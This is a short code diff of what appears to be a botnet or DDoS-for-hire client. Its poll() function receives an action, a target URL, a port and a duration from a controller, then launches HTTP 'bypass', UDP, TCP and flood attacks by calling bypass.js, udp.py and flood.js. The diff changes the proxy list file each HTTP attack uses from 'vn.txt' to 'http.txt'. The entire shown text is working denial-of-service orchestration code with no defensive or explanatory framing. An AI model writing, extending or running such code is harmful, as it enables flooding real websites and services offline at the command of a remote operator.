@@ -23,13 +23,13 @@ def poll():
                 duration = res.get("time", 60)
 
                 if action == "https":
-                    cmd = ["node", "bypass.js", "GET", url, str(duration), "245", "90", "vn.txt", "--query", "1", "--http", "2", "--full", "--winter"]
+                    cmd = ["node", "bypass.js", "GET", url, str(duration), "245", "90", "http.txt", "--query", "1", "--http", "2", "--full", "--winter"]
                 elif action == "udp":
                     cmd = ["python3", "udp.py", url, str(port), str(duration), "2000", "500"]
                 elif action == "tcp":
                     cmd = ["python3", "udp.py", url, str(port), str(duration), "2000", "500"]
                 elif action == "bypass":
-                    cmd = ["node", "bypass.js", "GET", url, str(duration), "80", "90", "vn.txt", "--query", "1", "--http", "2", "--full", "--winter"]
+                    cmd = ["node", "bypass.js", "GET", url, str(duration), "80", "90", "http.txt", "--query", "1", "--http", "2", "--full", "--winter"]
                 elif action == "flood":
                     cmd = ["node", "flood.js", url, str(duration), "20", "90"]
                 else:
@@ -81,4 +81,5 @@ if __name__ == "__main__":
     t2.join()
 
     
+
 
